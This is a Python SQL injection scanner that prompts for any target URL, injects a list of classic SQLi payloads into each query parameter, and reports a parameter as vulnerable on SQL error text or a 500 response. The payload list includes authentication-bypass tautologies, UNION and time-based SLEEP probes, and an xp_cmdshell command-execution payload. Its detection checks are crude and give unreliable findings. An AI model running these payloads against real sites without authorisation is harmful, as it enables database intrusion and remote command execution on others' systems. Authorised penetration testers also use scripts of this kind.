import requests
from urllib.parse import urlparse, parse_qs, urlencode

# Define SQLi payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' UNION SELECT null, null, null -- ",
    "1' AND 1=1 -- ",
    "1' AND 1=2 -- ",
    "' AND SLEEP(5) --",
    "' OR IF(1=1, SLEEP(5), 0); --",
    "' OR 1=1; --",
    "' OR 'x'='x'; --",
    "' OR 'x'='x' --",
    "1 OR 1=1",
    "' OR ''='",
    "admin'--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "'; EXEC xp_cmdshell('ping 10.10.10.10') --",
    "' AND 1=(SELECT COUNT(*) FROM tablename); --"
]

# Function to test a URL with a given payload
def test_sqli(base_url, params, payload, method="GET"):
    # Update the parameters with the payload
    test_params = {key: value + payload for key, value in params.items()}
    query_string = urlencode(test_params)
    full_url = f"{base_url}?{query_string}"
    
    print(f"Testing URL: {full_url}")  # Debugging output

    try:
        # Send the request
        if method == "GET":
            response = requests.get(full_url, timeout=10)
        elif method == "POST":
            response = requests.post(base_url, data=test_params, timeout=10)
        
        # Debugging output
        print(f"Response Code: {response.status_code}")
        print(f"Response Text: {response.text[:200]}")  # Print first 200 chars

        # Check for common SQLi indicators in the response
        error_indicators = [
            "syntax error", "mysql", "sql", "warning", "error", 
            "ORA-", "DB2 SQL error", "database error", 
            "you have an error in your sql syntax", "unclosed quotation mark after the character string",
            "unexpected end of input", "invalid input", "invalid SQL statement"
        ]
        
        # Look for typical SQLi indicators
        if any(indicator in response.text.lower() for indicator in error_indicators) or response.status_code == 500:
            return True, response.text
        
        # Look for changes in the response that indicate logic manipulation
        elif "1=1" in payload and "1=1" not in response.text:
            # Detect logic changes
            return True, response.text

        else:
            return False, response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")  # Debugging output
        return False, str(e)

# Function to scan a URL for SQLi
def scan_url_for_sqli(url, method="GET"):
    # Parse the URL and extract query parameters
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)

    # Flatten the params dictionary
    flat_params = {key: value[0] for key, value in params.items()}

    print(f"Base URL: {base_url}")  # Debugging output
    print(f"Params: {flat_params}")  # Debugging output

    vulnerable = False  # Flag to indicate if any vulnerability is found

    for param in flat_params:
        print(f"\nTesting parameter: {param}")
        for payload in payloads:
            is_vulnerable, response = test_sqli(base_url, {param: flat_params[param]}, payload, method)
            if is_vulnerable:
                print(f"[+] Vulnerable Payload Found for parameter '{param}': {payload}")
                print(f"Response: {response[:500]}")  # Print only the first 500 chars for brevity
                vulnerable = True
                break  # Stop further testing if one payload is successful
            else:
                print(f"[-] Not Vulnerable with Payload: {payload}")
        
        if vulnerable:
            break  # Stop testing other parameters if vulnerability is found

    if not vulnerable:
        print("\n[+] The target URL does not appear to be vulnerable to SQL injection with the tested payloads.")

# Main function
if __name__ == "__main__":
    target_url = input("Enter the target URL : ")
    request_method = input("Enter the request method (GET/POST): ").upper()
    
    if request_method not in ["GET", "POST"]:
        print("Invalid request method. Please enter GET or POST.")
    else:
        scan_url_for_sqli(target_url, request_method)
